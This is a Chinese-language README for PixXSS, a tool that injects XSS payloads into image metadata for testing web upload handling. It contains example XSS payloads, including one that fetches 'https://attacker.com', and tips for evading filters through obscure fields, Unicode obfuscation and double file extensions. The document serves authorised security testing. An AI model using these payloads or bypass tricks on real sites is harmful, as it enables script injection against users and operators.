[TOC]



# PixXSS - 图片元数据XSS注入工具

![Python](https://img.shields.io/badge/Python-3.6+-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)

## 工具简介

PixXSS 是一个专业级的图片元数据注入工具，专为安全研究人员设计，用于在图片文件的各类元数据字段中注入XSS负载。该工具支持多种图片格式和元数据类型，能够帮助安全人员测试Web应用对恶意图片的防护能力。

## 功能特性

✅ **多格式支持**  

- JPEG, PNG, GIF, WEBP, TIFF, HEIF, AVIF等主流图片格式

✅ **全面元数据覆盖**  

- EXIF, IPTC, XMP等标准元数据
- PNG特有的tEXt/zTXt/iTXt块
- GIF注释扩展块

✅ **高级功能**  

- 支持批量处理多个文件
- 可选择特定元数据字段或注入全部字段
- 支持从文件或命令行直接读取payload
- 保留原始文件或输出到新文件
- 完整的执行日志记录

✅ **专业特性**  

- 自动检测exiftool依赖
- 完善的错误处理和日志系统
- 支持Unicode字符集
- 详细的帮助文档

## 安装与依赖

### 系统要求

- Python 3.6+
- exiftool (自动检测并提示安装方法)

### 安装方法

```bash
git clone https://github.com/your-repo/PixXSS.git
cd PixXSS
pip install -r requirements.txt
```

## 使用说明

### 基本用法

```bash
python PixXSS.py -I input.jpg JPEG -payload "<script>alert(1)</script>" --all
```

### 参数说明

| 参数                      | 说明                                   |
| ------------------------- | -------------------------------------- |
| `-I FILE FMT`             | 输入文件及格式(如: image.jpg JPEG)     |
| `-payload PAYLOAD`        | 直接指定XSS负载                        |
| `--payload-file FILE`     | 从文件读取XSS负载                      |
| `-o OUTPUT`               | 输出文件路径                           |
| `--all`                   | 注入所有支持的元数据字段               |
| `--FORMAT-METATYPE-FIELD` | 指定特定字段注入(如: --PNG-tEXt-Title) |

### 示例场景

1. **测试Web图片上传漏洞**

```bash
python PixXSS.py -I avatar.png PNG --payload "<svg/onload=alert(1)>" --PNG-tEXt-Description
```

2. **批量处理多张图片**

```bash
python PixXSS.py -I img1.jpg JPEG -I img2.png PNG --payload-file xss.txt --all
```

3. **针对性测试特定CMS**

```bash
python PixXSS.py -I banner.webp WEBP --payload "<img src=x onerror=fetch('https://attacker.com')>" --WEBP-XMP-dc_title
```

## 技术细节

### 支持的元数据类型

```python
SUPPORTED_FORMATS = {
    "JPEG": ["EXIF", "IPTC", "XMP"],
    "PNG": ["tEXt", "zTXt", "iTXt", "XMP"],
    # ...其他格式支持...
}
```

### 日志系统

- 实时控制台输出
- 自动记录到pixxss.log文件
- 详细调试信息

## 最佳实践

1. **靶场测试**

- 先在本地环境测试payload有效性
- 使用不同图片格式验证目标系统解析差异

2. **规避检测**

- 尝试在较少被检查的字段注入(如UserComment)
- 使用Unicode字符混淆payload

3. **高级技巧**

- 结合多字段注入增加成功率
- 使用图片双扩展名绕过过滤(如image.jpg.php)

## 免责声明

本工具仅限用于合法安全测试和研究目的。使用者需确保已获得目标系统的测试授权，未经授权使用本工具造成的任何后果由使用者自行承担。
